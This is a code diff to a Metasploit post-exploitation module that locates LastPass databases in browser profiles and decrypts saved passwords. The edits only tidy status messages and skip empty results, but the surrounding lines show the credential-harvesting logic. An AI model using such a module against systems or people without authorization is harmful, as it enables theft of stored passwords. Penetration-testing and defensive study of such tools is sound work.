@@ -34,7 +34,7 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    print_status "Searching for LastPass databases..."
+    print_status "Searching for LastPass databases"
 
     account_map = build_account_map
     if account_map.empty?
@@ -100,7 +100,7 @@ class Metasploit3 < Msf::Post
     # Parse and decrypt credentials
     credentials.each do |row| # Decrypt passwords
       account, browser, user, enc_pass = row
-      vprint_status "Decrypting password for #{account}'s #{user} from #{browser}..."
+      vprint_status "Decrypting password for #{account}'s #{user} from #{browser}"
       password = clear_text_password(user, enc_pass)
       credentials_table << [account, browser, user, password]
     end
@@ -149,7 +149,8 @@ class Metasploit3 < Msf::Post
 
       found_dbs_map[account] = {}
       browser_path_map.each_pair do |browser, path|
-        found_dbs_map[account][browser] = find_db_paths(path, browser, account)
+        db_paths = find_db_paths(path, browser, account)
+        found_dbs_map[account][browser] = db_paths unless db_paths.empty?
       end
     end
 
@@ -161,7 +162,7 @@ class Metasploit3 < Msf::Post
   def find_db_paths(path, browser, account)
     paths = []
 
-    vprint_status "Checking #{account}'s #{browser}..."
+    vprint_status "Checking #{account}'s #{browser}"
     if browser == "Firefox" # Special case for Firefox
       profiles = firefox_profile_files(path, browser)
       paths |= profiles
